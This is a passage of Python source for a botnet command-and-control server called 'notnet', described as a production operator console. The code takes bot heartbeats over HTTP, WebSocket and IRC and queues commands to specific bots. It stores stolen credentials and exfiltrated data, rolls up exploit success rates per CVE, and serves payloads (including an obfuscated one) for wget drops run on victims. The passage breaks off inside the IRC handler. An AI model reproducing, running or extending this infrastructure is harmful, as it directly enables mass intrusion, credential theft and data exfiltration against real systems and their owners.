#!/usr/bin/env python3
"""notnet C2 server — production operator console for the notnet bot.

Implements the SAME wire contract the sim mocks define (tests/sim/c2/c2_http.py),
so the real fleet and the sim fleet speak one protocol:

  POST <http_path>            heartbeat / command response  {"cmd":"status",...}
  POST <http_path>/exfil      credential-log / file exfil chunks
  GET  /bot/<name>            payload binary (payload_dir/<name>)
  GET  /bot/token             one-time short-TTL download token (#190)
  GET  /notnet-src.tar        on-target compile source bundle

State is SQLite. Operator commands go through a queue dir (same protocol as
the sim: channel-tagged files, atomic rename claim) with an optional per-bot
"target" tag so commands reach ONE specific bot. c2ctl (this repo) is the
operator CLI; console.py serves the dashboard + JSON API.

Auth: only responses to requests that AUTHENTICATED echo the configured
c2_secret (the bot verifies it). Rejects and unknown paths answer with a
bare ack that never contains the secret (#331/#207) — an unauthenticated
caller must not be able to read the fleet secret off the wire.
"""

import argparse
import hmac
import json
import os
import re
import secrets
import signal
import socket
import sqlite3
import ssl
import struct
import sys
import threading
import time
from datetime import datetime, timezone

try:
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
except ImportError:  # pragma: no cover
    BaseHTTPRequestHandler = ThreadingHTTPServer = None

DEFAULT_SECRET = "notnet-v1"          # operator MUST override via --secret
DEFAULT_HTTP = 8080
DEFAULT_PAYLOAD = 8443
DEFAULT_WS = 8081
DEFAULT_IRC = 6667
DEFAULT_CONSOLE = 8090

# Request-size caps (#165/#166/#183): a bot request is small JSON or a
# PAYLOAD_MAX_SIZE (64KB) upload; anything larger is an attack or a bug.
MAX_HTTP_REQUEST = 2 * 1024 * 1024        # total buffered bytes per request
MAX_UPLOAD_BODY = 8 * 1024 * 1024         # upload body cap (128x payload max)
MAX_WS_FRAME = 1024 * 1024                # WS frame payload cap
UPLOAD_NAME_RE = re.compile(r"^[A-Za-z0-9._-]{1,128}$")

_lock = threading.Lock()


def log(line):
    ts = datetime.now(timezone.utc).isoformat()
    with _lock:
        print(f"[{ts}] {line}", flush=True)


# ─────────────────────────── queue protocol ───────────────────────────
# Same as the sim: files dropped into queue/ (channel-tagged prefix
# http-|ws-|irc-, plus an optional JSON "target" = bot tag). Atomic claim
# via rename-to-claimed so exactly one listener serves each file.

def next_command(queue_dir, channel, tag=None):
    """Pop the oldest queued command for this channel; None if none.

    tag is the requesting bot's tag: a queued command with a "target" field
    is served only to that bot; commands without a target go to any bot on
    the channel (legacy behaviour, matches the sim driver).
    """
    try:
        files = sorted(os.listdir(queue_dir))
    except FileNotFoundError:
        return None
    for fn in files:
        if not fn.endswith(".json"):
            continue
        if _channel_of(fn) not in (None, channel):
            continue
        src = os.path.join(queue_dir, fn)
        # Broadcast commands (bc- prefix) are peeked, never consumed:
        # every bot on every channel sees them on every poll. The only
        # sane broadcast payload is `kill` — it is one-way and the bot
        # exits before it can poll again, so re-delivery is harmless.
        if fn.startswith("bc-"):
            try:
                with open(src) as f:
                    data = json.load(f)
            except (json.JSONDecodeError, OSError):
                continue
            if data.get("broadcast"):
                return data
            continue
        claimed = src + ".claimed"
        try:
            os.rename(src, claimed)
        except OSError:
            continue
        try:
            with open(claimed) as f:
                data = json.load(f)
        except (json.JSONDecodeError, OSError):
            os.unlink(claimed)
            continue
        tgt = data.get("target") or ""
        # A request with no identity (tag=None) must only claim UNTARGETED
        # commands — otherwise the IRC loop's idle poll would claim a
        # targeted file, find it "not for me", and drop it (consumed file,
        # command lost, heartbeat branch never sees it).
        if tgt and tgt != (tag or ""):
            # not for this bot — put it back so another bot can claim it
            try:
                os.rename(claimed, src)
            except OSError:
                os.unlink(claimed)
            continue
        try:
            os.unlink(claimed)
        except OSError:
            pass
        return data
    return None


def _channel_of(fn):
    for ch in ("http-", "ws-", "irc-"):
        if fn.startswith(ch):
            return ch[:-1]
    return None


# ─────────────────────────── state store ───────────────────────────

# #160: heartbeat cve_stats format — comma-separated
# "CVE-YYYY-NNNN:hit|miss|fail=N" triplets (non-zero counters only).
_CVE_STATS_RE = re.compile(r"(CVE-\d{4}-\d+):(hit|miss|fail)=(\d+)")


def parse_cve_stats(raw):
    """Parse one bot's cve_stats string into {cve_id: {hit,miss,fail}}."""
    out = {}
    for m in _CVE_STATS_RE.finditer(raw or ""):
        cid, kind, n = m.group(1), m.group(2), int(m.group(3))
        d = out.setdefault(cid, {"hit": 0, "miss": 0, "fail": 0})
        d[kind] += n
    return out


def cve_rollup(state):
    """Aggregate every bot's cve_stats into a per-CVE success-rate table:
    {cve_id: {hit, miss, fail, total, rate}} — rate = hit % of attempts."""
    roll = {}
    for (raw,) in state.db.execute(
            "SELECT cve_stats FROM bots WHERE cve_stats IS NOT NULL"):
        for cid, d in parse_cve_stats(raw).items():
            r = roll.setdefault(cid, {"hit": 0, "miss": 0, "fail": 0})
            for k, v in d.items():
                r[k] += v
    for r in roll.values():
        total = r["hit"] + r["miss"] + r["fail"]
        r["total"] = total
        r["rate"] = round(100.0 * r["hit"] / total, 1) if total else 0.0
    return dict(sorted(roll.items()))


SCHEMA = """
CREATE TABLE IF NOT EXISTS bots (
    hostname    TEXT PRIMARY KEY,
    tag         TEXT,
    ip          TEXT,
    version     TEXT,
    uptime      INTEGER,
    scan_count  INTEGER,
    cred_count  INTEGER,
    proxy_on    INTEGER,
    proxy_port  INTEGER,
    relay_on    INTEGER,
    relay_port  INTEGER,
    channel     TEXT,
    last_seen   REAL,
    cve_stats   TEXT
);
CREATE TABLE IF NOT EXISTS commands (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    target      TEXT,
    cmd         TEXT,
    args        TEXT,
    queued_at   REAL,
    served_at   REAL,
    served_to   TEXT
);
CREATE TABLE IF NOT EXISTS creds (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    line        TEXT,
    source_ip   TEXT,
    received_at REAL
);
CREATE TABLE IF NOT EXISTS exfil (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    chunk       TEXT,
    source_ip   TEXT,
    received_at REAL
);
CREATE TABLE IF NOT EXISTS events (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    ts          REAL,
    kind        TEXT,
    detail      TEXT
);
"""


class State:
    def __init__(self, path):
        self.db = sqlite3.connect(path, check_same_thread=False)
        self.db.executescript(SCHEMA)
        self._migrate()
        self.db.commit()
        self._lk = threading.Lock()

    def _migrate(self):
        # #160: cve_stats column on bots (per-CVE hit/miss/fail triplets
        # reported in heartbeats). CREATE TABLE IF NOT EXISTS covers new
        # databases; this ALTER covers databases created before the
        # column existed (idempotent via PRAGMA table_info).
        cols = {r[1] for r in self.db.execute("PRAGMA table_info(bots)")}
        if "cve_stats" not in cols:
            self.db.execute("ALTER TABLE bots ADD COLUMN cve_stats TEXT")

    def upsert_bot(self, hb, ip, channel):
        tag = hb.get("tag", "")
        # #160: comma-separated "CVE-xxxx:kind=N" triplets from the bot;
        # older bots simply omit the field -> stored as NULL/empty.
        cve_stats = str(hb.get("cve_stats", "") or "")[:4096]
        with self._lk:
            self.db.execute(
                """INSERT INTO bots(hostname,tag,ip,version,uptime,scan_count,
                   cred_count,proxy_on,proxy_port,relay_on,relay_port,channel,last_seen,cve_stats)
                   VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)
                   ON CONFLICT(hostname) DO UPDATE SET
                     tag=excluded.tag, ip=excluded.ip, version=excluded.version,
                     uptime=excluded.uptime, scan_count=excluded.scan_count,
                     cred_count=excluded.cred_count, proxy_on=excluded.proxy_on,
                     proxy_port=excluded.proxy_port, relay_on=excluded.relay_on,
                     relay_port=excluded.relay_port, channel=excluded.channel,
                     last_seen=excluded.last_seen, cve_stats=excluded.cve_stats""",
                (hb.get("hostname", ""), tag, ip, hb.get("version", ""),
                 hb.get("uptime", 0), hb.get("scan_count", 0),
                 hb.get("cred_count", 0), hb.get("proxy_on", 0),
                 hb.get("proxy_port", 0), hb.get("relay_on", 0),
                 hb.get("relay_port", 0), channel, time.time(), cve_stats))
            self.db.commit()

    def record_command(self, target, cmd, args):
        with self._lk:
            cur = self.db.execute(
                "INSERT INTO commands(target,cmd,args,queued_at) VALUES(?,?,?,?)",
                (target, cmd, args, time.time()))
            self.db.commit()
            return cur.lastrowid

    def mark_served(self, cmd_id, tag):
        with self._lk:
            self.db.execute(
                "UPDATE commands SET served_at=?, served_to=? WHERE id=?",
                (time.time(), tag, cmd_id))
            self.db.commit()

    def add_cred(self, line, ip):
        with self._lk:
            self.db.execute(
                "INSERT INTO creds(line,source_ip,received_at) VALUES(?,?,?)",
                (line[:4096], ip, time.time()))
            self.db.commit()

    def add_exfil(self, chunk, ip):
        with self._lk:
            self.db.execute(
                "INSERT INTO exfil(chunk,source_ip,received_at) VALUES(?,?,?)",
                (chunk[:65536], ip, time.time()))
            self.db.commit()

    def add_event(self, kind, detail):
        with self._lk:
            self.db.execute(
                "INSERT INTO events(ts,kind,detail) VALUES(?,?,?)",
                (time.time(), kind, detail[:2048]))
            self.db.commit()

    def bots(self):
        with self._lk:
            return self.db.execute(
                "SELECT * FROM bots ORDER BY last_seen DESC").fetchall()

    def commands(self, limit=50):
        with self._lk:
            return self.db.execute(
                "SELECT * FROM commands ORDER BY id DESC LIMIT ?",
                (limit,)).fetchall()

    def creds(self, limit=200):
        with self._lk:
            return self.db.execute(
                "SELECT * FROM creds ORDER BY id DESC LIMIT ?",
                (limit,)).fetchall()

    def exfil(self, limit=50):
        with self._lk:
            return self.db.execute(
                "SELECT * FROM exfil ORDER BY id DESC LIMIT ?",
                (limit,)).fetchall()


# ─────────────────────────── HTTP C2 + payload ───────────────────────────
# Raw-socket keep-alive loop, ported from the sim mock (tests/sim/c2/c2_http.py)
# — the bot sends "Connection: keep-alive" and REUSES the socket; the mock
# responds, keeps reading on the same connection, and only closes on EOF.
# A one-request-per-connection server (Connection: close) makes the bot's
# connected flag drop and the autonomous-spread gate open (#95).

def recv_http(conn):
    """Read one HTTP request from conn.

    Returns (method, path, body, headers) or None on close. `headers` is a
    lower-cased dict of the request headers (used for Content-Type routing
    of uploads, #134).

    #165: total buffered bytes are capped at MAX_HTTP_REQUEST and an
    oversized declared Content-Length is rejected up front, so a client
    cannot grow the buffer without bound (slowloris with huge headers or
    a giant body)."""
    conn.settimeout(30)
    buf = b""
    try:
        while True:
            if len(buf) > MAX_HTTP_REQUEST:
                log(f"HTTP request exceeds {MAX_HTTP_REQUEST} bytes — dropped")
                return None
            chunk = conn.recv(8192)
            if not chunk:
                return None
            buf += chunk
            while True:
                he = buf.find(b"\r\n\r\n")
                if he == -1:
                    break
                header_data = buf[:he]
                rest = buf[he + 4:]
                lines = header_data.decode("utf-8", errors="replace").split("\r\n")
                reqline = lines[0]
                if not reqline:
                    buf = rest
                    continue
                parts = reqline.split(" ")
                if len(parts) < 2:
                    return None
                method, path = parts[0], parts[1]
                headers = {}
                clen = 0
                for h in lines[1:]:
                    if ":" not in h:
                        continue
                    k, v = h.split(":", 1)
                    headers[k.strip().lower()] = v.strip()
                    if k.strip().lower() == "content-length":
                        try:
                            clen = int(v.strip())
                        except ValueError:
                            clen = 0
                if clen > MAX_HTTP_REQUEST:
                    log(f"HTTP Content-Length {clen} exceeds cap — dropped")
                    return None
                if len(rest) < clen:
                    break  # need more body bytes
                body = rest[:clen]
                buf = rest[clen:]
                return method, path, body, headers
    except (socket.timeout, ConnectionError, OSError):
        return None


def http_send(conn, body):
    body_b = body.encode("utf-8")
    resp = (
        "HTTP/1.1 200 OK\r\n"
        "Server: NotnetC2/0.1\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body_b)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("utf-8") + body_b
    try:
        conn.sendall(resp)
    except OSError:
        pass


def http_send_file(conn, path, ctype):
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        data = b""
    resp = (
        "HTTP/1.1 200 OK\r\n"
        "Server: NotnetC2/0.1\r\n"
        f"Content-Type: {ctype}\r\n"
        f"Content-Length: {len(data)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("utf-8") + data
    try:
        conn.sendall(resp)
    except OSError:
        pass


def _ingest_upload(c2, body, ip, path, secret_ok=False):
    """Persist an uploaded file from the bot (#134).

    Writes the raw bytes to <payload_dir>/uploads/<ts>-<ip>.bin and logs
    the receipt (size + source). Previously these POSTs were acked and
    dropped. Returns the saved path or None.

    #164: uploads now REQUIRE the shared secret (secret_ok=True — the
    caller checks the X-Notnet-Secret header) and a body size cap.
    #183: an explicit /upload/<name> name must match a safe charset, so a
    crafted URL can never escape uploads/ or smuggle odd filenames."""
    if not secret_ok:
        c2.state.add_event("auth_fail", f"upload without secret from {ip}")
        c2.auth_fail_count += 1  # #195: silently dropped uploads are a
        # version-skew symptom too — count them where the operator looks.
        log(f"UPLOAD REJECT {ip} (no secret)")
        return None
    if not body:
        return None
    if len(body) > MAX_UPLOAD_BODY:
        c2.state.add_event("upload_reject", f"{len(body)} bytes from {ip} exceeds cap")
        log(f"UPLOAD REJECT {ip} {len(body)} bytes (over {MAX_UPLOAD_BODY})")
        return None
    up_dir = os.path.join(c2.payload_dir, "uploads")
    try:
        os.makedirs(up_dir, exist_ok=True)
    except OSError:
        pass
    ts = int(time.time() * 1000)
    # basename of an explicit /upload/<name> if present, else ip timestamp
    name = os.path.basename(path.rstrip("/")) if path.endswith("/upload") or "/upload/" in path \
        else f"upload-{ts}-{ip.replace('.', '_')}.bin"
    if not name or name == "upload":
        name = f"upload-{ts}-{ip.replace('.', '_')}.bin"
    # #183: only a safe charset survives; anything else falls back to the
    # generated name (never a 4xx — the bot treats non-2xx as failure).
    if not UPLOAD_NAME_RE.match(name):
        log(f"UPLOAD {ip}: unsafe name {name!r} — using generated name")
        name = f"upload-{ts}-{ip.replace('.', '_')}.bin"
    dest = os.path.join(up_dir, name)
    # Defense in depth: the join must still resolve inside up_dir.
    if os.path.dirname(os.path.abspath(dest)) != os.path.abspath(up_dir):
        log(f"UPLOAD REJECT {ip}: path escape attempt {name!r}")
        return None
    try:
        with open(dest, "wb") as f:
            f.write(body)
        c2.state.add_event("upload", f"{len(body)} bytes from {ip} -> {dest}")
        log(f"UPLOAD {ip} {len(body)} bytes -> {dest}")
        c2.ev(f"C2 UPLOAD {ip} {len(body)} bytes -> {dest}")
        return dest
    except OSError as e:
        log(f"UPLOAD FAIL {ip}: {e}")
        return None


def _request_secret_ok(c2, headers, j):
    """#164/#167: shared-secret check for non-heartbeat requests.

    Accepts the secret from (in order): the X-Notnet-Secret header, the
    ?secret= query param, or the JSON body's "secret" field. Constant-time
    compare. The bot's http_upload/http_post are updated to send the
    header; the query/body forms keep older bots working."""
    supplied = (headers.get("x-notnet-secret")
                or _query_param(headers.get("http-target-path", ""), "secret")
                or (j.get("secret") if isinstance(j, dict) else "")
                or "")
    return hmac.compare_digest(str(supplied), str(c2.secret))


def _secret_matches(c2, supplied):
    """Constant-time shared-secret compare (#216/#333).

    Every fleet-secret check routes through this so no handler falls back
    to a short-circuiting `!=` timing oracle."""
    return hmac.compare_digest(str(supplied or ""), str(c2.secret))


def _query_param(path, key):
    """Extract one query param from a raw request path (no decode needed —
    the secret charset is URL-safe)."""
    q = path.split("?", 1)[1] if "?" in path else ""
    for part in q.split("&"):
        k, _, v = part.partition("=")
        if k == key:
            return v
    return ""


# #190: single-use download tokens. The CVE/LOTL drop commands run busybox
# wget on the VICTIM, so the fleet secret used to travel in the injected
# shell command, the exploit request body, and victim logs (CWE-200). Now a
# bot fetches a short-TTL one-time token (secret-authenticated) and puts
# THAT in the drop URL; the C2 consumes it on first use.
DL_TOKEN_TTL_S = 60


def _dl_token_issue(c2):
    """Mint a one-time download token, pruning expired ones."""
    tok = secrets.token_urlsafe(32)
    now = time.time()
    with c2.dl_tokens_lock:
        for k in [k for k, exp in c2.dl_tokens.items() if exp <= now]:
            del c2.dl_tokens[k]
        c2.dl_tokens[tok] = now + DL_TOKEN_TTL_S
    return tok


def _dl_token_consume(c2, tok):
    """Validate + consume a download token (single use). Constant-time
    compare against each live token; expired entries are pruned."""
    if not tok:
        return False
    now = time.time()
    with c2.dl_tokens_lock:
        for k in [k for k, exp in c2.dl_tokens.items() if exp <= now]:
            del c2.dl_tokens[k]
        for k in list(c2.dl_tokens):
            if hmac.compare_digest(k, tok):
                del c2.dl_tokens[k]
                return True
    return False


def handle_http(conn, addr, c2):
    ip = addr[0]
    try:
        while True:
            req = recv_http(conn)
            if req is None:
                return
            method, path, body, headers = req
            # keep the raw path (with query) for param extraction, strip
            # the query for routing
            raw_path = path
            path = path.split("?", 1)[0].rstrip("/")
            ctype = (headers.get("content-type") or "").lower()
            text = body.decode("utf-8", errors="replace")
            try:
                j = json.loads(text) if text else {}
            except json.JSONDecodeError:
                j = {}

            # #134: bot `upload` command POSTs the file as
            # application/octet-stream (src/protocol.c http_upload). The
            # default remote path is the heartbeat path, so an octet-stream
            # POST there is an upload, NOT a command response (those are
            # JSON). Explicit `upload <f> /upload` (or any http:// URL with
            # path /upload) hits the dedicated route below.
            # #164: uploads REQUIRE the shared secret now (header or ?secret=).
            if method == "POST" and (
                    (path == c2.http_path.rstrip("/") and "octet-stream" in ctype)
                    or path.endswith("/upload") or "/upload/" in path):
                secret_ok = _request_secret_ok(c2, headers, j)
                _ingest_upload(c2, body, ip, raw_path, secret_ok=secret_ok)
                # #331/#207: reject responses must not carry the secret.
                resp = {"status": "ok"}
                if secret_ok:
                    resp["secret"] = c2.secret
                http_send(conn, json.dumps(resp))
                continue

            if method == "POST" and path == c2.http_path.rstrip("/"):
                kind = "heartbeat" if j.get("cmd") == "status" else "response"
                secret = j.get("secret", "")
                # Secret is verified on HEARTBEATS only — the bot's command
                # responses do NOT carry a body secret; they authenticate via
                # _request_secret_ok below (header / ?secret= / body field).
                # #216/#333: constant-time compare.
                if kind == "heartbeat" and not _secret_matches(c2, secret):
                    c2.state.add_event("auth_fail",
                                       f"bad secret from {ip} host={j.get('hostname','')}")
                    c2.auth_fail_count += 1  # #195
                    log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
                    # #331/#207: unauthenticated caller — no secret echo.
                    http_send(conn, json.dumps({"status": "ok"}))
                    continue
                # #167: command responses used to be stored with zero auth —
                # any host could upsert fake bot rows and inject evidence
                # lines. Now they must carry the secret (header or body).
                if kind != "heartbeat" and not _request_secret_ok(c2, headers, j):
                    c2.state.add_event("auth_fail",
                                       f"response without secret from {ip}")
                    c2.resp_reject_count += 1  # #195
                    log(f"RESP-REJECT {ip} (no secret)")
                    # #331/#207: unauthenticated caller — no secret echo.
                    http_send(conn, json.dumps({"status": "ok"}))
                    continue
                c2.state.upsert_bot(j, ip, "http")
                log(f"HTTP {kind} {ip} host={j.get('hostname','')} tag={j.get('tag','')}")
                if kind == "heartbeat":
                    c2.ev(f"C2 heartbeat from {ip} body={text}")
                    if c2.is_bot(ip):
                        q = next_command(c2.queue_dir, "http", tag=j.get("tag"))
                        if q is not None:
                            c2.state.mark_served(q.get("_id", 0), j.get("tag", ""))
                            log(f"SERVE http -> {j.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
                            c2.ev(f"SERVE cmd={q.get('cmd')} args={q.get('args')!r}")
                            http_send(conn, json.dumps({"cmd": q.get("cmd", "status"),
                                                        "args": q.get("args", ""),
                                                        "secret": c2.secret}))
                            continue
                else:
                    c2.ev(f"C2 RESP from {ip}: {text}")
                http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                continue

            if method == "POST" and path.endswith("/exfil"):
                # #216/#333: constant-time compare.
                if not _secret_matches(c2, j.get("secret")):
                    # #331/#207: unauthenticated caller — no secret echo.
                    http_send(conn, json.dumps({"status": "ok"}))
                    continue
                c2.state.add_exfil(text, ip)
                log(f"EXFIL {ip} len={len(text)}")
                http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                continue

            # #173: payload + source-tarball downloads now require the
            # shared secret (?secret= on the URL, matching the bot's
            # http_get_url which appends it). Unauthenticated GETs get the
            # generic ok-ack so scanners learn nothing.
            # #190: a single-use short-TTL download token (?token=) is also
            # accepted — that is what drop URLs carry now, so the fleet
            # secret never reaches the victim. The token is consumed on
            # first use.
            if method == "GET" and (path == "/bot/notnet" or path == "/notnet-src.tar"
                                    or path.startswith("/bot/")):
                # raw_path carries the query string — that's where the
                # wget/curl ?secret= lives (headers have none).
                secret_ok = _request_secret_ok(c2, headers,
                                               {"secret": _query_param(raw_path, "secret")})
                # don't burn a live token on a token-fetch request
                token_ok = (False if path == "/bot/token"
                            else _dl_token_consume(c2, _query_param(raw_path, "token")))
                if not (secret_ok or token_ok):
                    c2.payload_reject_count += 1  # #195
                    log(f"PAYLOAD REJECT {ip} (no secret/token)")
                    # #331/#207: unauthenticated caller — no secret echo.
                    http_send(conn, json.dumps({"status": "ok"}))
                    continue
                log(f"PAYLOAD auth {ip} ({'token' if token_ok and not secret_ok else 'secret'})")
                if path == "/bot/token":
                    # #190: secret-authenticated one-time download token.
                    tok = _dl_token_issue(c2)
                    log(f"TOKEN issue -> {ip}")
                    http_send(conn, json.dumps({"token": tok, "secret": c2.secret}))
                    continue
                if path == "/bot/notnet":
                    http_send_file(conn, os.path.join(c2.payload_dir, "notnet"),
                                   "application/octet-stream")
                    log(f"PAYLOAD notnet download from {ip}")
                    c2.ev(f"C2 PAYLOAD download from {ip}")
                    continue
                if path == "/bot/notnet.enc":
                    # ISSUE #159 (SIMULATION-ONLY): XOR-obfuscated payload,
                    # generated at startup from --payload-xor-key. The bot
                    # de-XORs it in memory (obfuscation-grade, NOT
                    # encryption). Served under the same secret/token auth
                    # as every other /bot/ route above.
                    enc_path = os.path.join(c2.payload_dir, "notnet.xor")
                    if os.path.isfile(enc_path):
                        http_send_file(conn, enc_path,
                                       "application/octet-stream")
                        log(f"PAYLOAD notnet.enc download from {ip}")
                        c2.ev(f"C2 PAYLOAD download from {ip} (.enc)")
                    else:
                        log(f"PAYLOAD notnet.enc MISS from {ip} (no notnet.xor)")
                    continue
                if path == "/notnet-src.tar":
                    http_send_file(conn, os.path.join(c2.payload_dir, "notnet-src.tar"),
                                   "application/x-tar")
                    log(f"SRC-TAR download from {ip}")
                    continue
                fname = os.path.basename(path)
                full = os.path.join(c2.payload_dir, fname)
                if os.path.isfile(full):
                    http_send_file(conn, full, "application/octet-stream")
                    log(f"PAYLOAD {fname} download from {ip}")
                    c2.ev(f"C2 PAYLOAD download from {ip}")
                    continue

            # #331/#207: unknown-path fallthrough is UNAUTHENTICATED —
            # respond with a bare ack, never the fleet secret.
            http_send(conn, json.dumps({"status": "ok"}))
    except (socket.timeout, ConnectionError, OSError):
        pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


def serve_http(c2, port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(64)
    log(f"LISTEN HTTP C2 on 0.0.0.0:{port} path={c2.http_path}"
        + (" TLS" if c2.tls_ctx else ""))
    while True:
        try:
            conn, addr = srv.accept()
            if c2.tls_ctx is not None:
                try:
                    conn = c2.tls_ctx.wrap_socket(conn, server_side=True)
                except (ssl.SSLError, OSError) as e:
                    log(f"TLS handshake failed from {addr[0]}: {e}")
                    try:
                        conn.close()
                    except OSError:
                        pass
                    continue
            _spawn_conn_thread(handle_http, conn, addr, c2)
        except KeyboardInterrupt:
            break


# ─────────────────────────── WebSocket C2 (RFC 6455) ───────────────────────────
# Framing ported from the sim mock (tests/sim/c2/c2_ws.py); the bot's
# ws_connect handshake is verified against Sec-WebSocket-Accept.

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"


def _ws_accept(key):
    import base64
    import hashlib
    return base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()


def ws_handshake(conn):
    data = b""
    try:
        while b"\r\n\r\n" not in data:
            chunk = conn.recv(4096)
            if not chunk:
                return False
            data += chunk
        head = data.split(b"\r\n\r\n", 1)[0].decode("utf-8", errors="replace")
        lines = head.split("\r\n")
        if not lines or "GET" not in lines[0]:
            return False
        key = None
        for line in lines[1:]:
            if line.lower().startswith("sec-websocket-key:"):
                key = line.split(":", 1)[1].strip()
        if not key:
            return False
        accept = _ws_accept(key)
        conn.sendall((
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept}\r\n"
            "\r\n").encode())
        return True
    except (socket.timeout, ConnectionError, OSError):
        return False


def ws_recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("EOF")
        buf += chunk
    return buf


def ws_read_frame(conn):
    """Read one WS frame. #166: frames above MAX_WS_FRAME are rejected
    (returns (0, b"")) instead of allocating whatever the 64-bit length
    claims — a client could otherwise stream multi-GB frames slowly."""
    hdr = ws_recv_exact(conn, 2)
    opcode = hdr[0] & 0x0F
    masked = (hdr[1] >> 7) & 1
    plen = hdr[1] & 0x7F
    if plen == 126:
        plen = int.from_bytes(ws_recv_exact(conn, 2), "big")
    elif plen == 127:
        plen = int.from_bytes(ws_recv_exact(conn, 8), "big")
    if plen > MAX_WS_FRAME:
        log(f"WS frame {plen} bytes exceeds cap — dropped")
        return 0, b""
    mask = ws_recv_exact(conn, 4) if masked else b""
    payload = ws_recv_exact(conn, plen)
    if mask:
        payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    return opcode, payload


def ws_send_text(conn, text):
    payload = text.encode("utf-8")
    ln = len(payload)
    if ln < 126:
        hdr = bytes([0x81, ln])
    elif ln < 65536:
        hdr = bytes([0x81, 126]) + struct.pack(">H", ln)
    else:
        hdr = bytes([0x81, 127]) + struct.pack(">Q", ln)
    conn.sendall(hdr + payload)


def handle_ws(conn, addr, c2):
    ip = addr[0]
    try:
        if not ws_handshake(conn):
            return
        log(f"WS CONNECT {ip}")
        while True:
            opcode, payload = ws_read_frame(conn)
            if opcode == 0x8:  # close
                log(f"WS CLOSE {ip}")
                return
            if opcode in (0x9, 0xA):  # ping/pong
                continue
            if opcode != 0x1:
                continue
            text = payload.decode("utf-8", errors="replace")
            try:
                j = json.loads(text)
            except json.JSONDecodeError:
                j = {}
            log(f"WS FRAME {ip}: {text[:200]}")
            c2.ev(f"WS FRAME {ip}: {text[:300]}")
            if j.get("cmd") == "status":
                # #216/#333: constant-time compare.
                if not _secret_matches(c2, j.get("secret")):
                    c2.state.add_event("auth_fail",
                                       f"bad ws secret from {ip} host={j.get('hostname','')}")
                    c2.auth_fail_count += 1  # #195
                    log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
                    # #331/#207: unauthenticated caller — no secret echo.
                    ws_send_text(conn, json.dumps({"status": "ok"}))
                    continue
                c2.state.upsert_bot(j, ip, "ws")
                if c2.is_bot(ip):
                    q = next_command(c2.queue_dir, "ws", tag=j.get("tag"))
                    if q is not None:
                        c2.state.mark_served(q.get("_id", 0), j.get("tag", ""))
                        log(f"SERVE ws -> {j.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
                        out = json.dumps({"cmd": q.get("cmd", "status"),
                                          "args": q.get("args", ""),
                                          "secret": c2.secret})
                        c2.ev(f"WS SERVE {out}")
                        ws_send_text(conn, out)
                        continue
            elif j and not _request_secret_ok(c2, {}, j):
                # #167: non-heartbeat WS frames (bot responses) used to be
                # logged/ev'd with zero auth — same injection gap as HTTP.
                c2.resp_reject_count += 1  # #195
                log(f"WS RESP-REJECT {ip} (no secret)")
                # #331/#207: rejected frame — bare ack, no secret echo.
                ws_send_text(conn, json.dumps({"status": "ok"}))
                continue
            # Authenticated frame (heartbeat with no queued command, or a
            # valid command response): the ack echoes the secret so the bot
            # can verify it came from the real C2.
            ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
    except (socket.timeout, ConnectionError, OSError):
        pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


def serve_ws(c2, port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(32)
    log(f"LISTEN WS C2 on 0.0.0.0:{port}")
    while True:
        try:
            conn, addr = srv.accept()
            _spawn_conn_thread(handle_ws, conn, addr, c2)
        except KeyboardInterrupt:
            break


# ─────────────────────────── IRC C2 (legacy channel) ───────────────────────────
# Flow ported from the sim mock (tests/sim/c2/c2_irc.py): welcome burst on
# NICK (001/250/376), 366 on JOIN, then a queue-serving read loop.

def irc_send(conn, line):
    try:
        conn.sendall((line + "\r\n").encode())
    except OSError:
        pass


def handle_irc(conn, addr, c2, nick, channel):
    ip = addr[0]
    conn.settimeout(30)
    buf = ""
    bot_nick = "bot"
    chan = channel
    try:
        # read until the first CRLF (NICK/USER burst)
        for _ in range(10):
            try:
                data = conn.recv(1024).decode(errors="replace")
                buf += data
                if "\r\n" in data:
                    break
            except socket.timeout:
                break
        for line in buf.split("\r\n"):
            line = line.strip()
            if line.startswith("NICK"):
                parts = line.split()
                bot_nick = parts[1] if len(parts) > 1 else "bot"
                irc_send(conn, f":{nick} 001 {bot_nick} :{nick}!{nick}@127.0.0.1")
                irc_send(conn, f":{nick} 250 {bot_nick} :Connection counts")
                irc_send(conn, f":{nick} 376 {bot_nick} :End of /MOTD")
                log(f"IRC CONNECT {ip} nick={bot_nick}")
                break
        # JOIN may already be in buf (NICK+USER+JOIN coalesce)
        joined = False
        for line in buf.split("\r\n"):
            line = line.strip()
            if line.startswith("JOIN"):
                parts = line.split()
                chan = parts[1] if len(parts) > 1 else channel
                irc_send(conn, f":{nick} 366 {bot_nick} {chan} :End of /NAMES list")
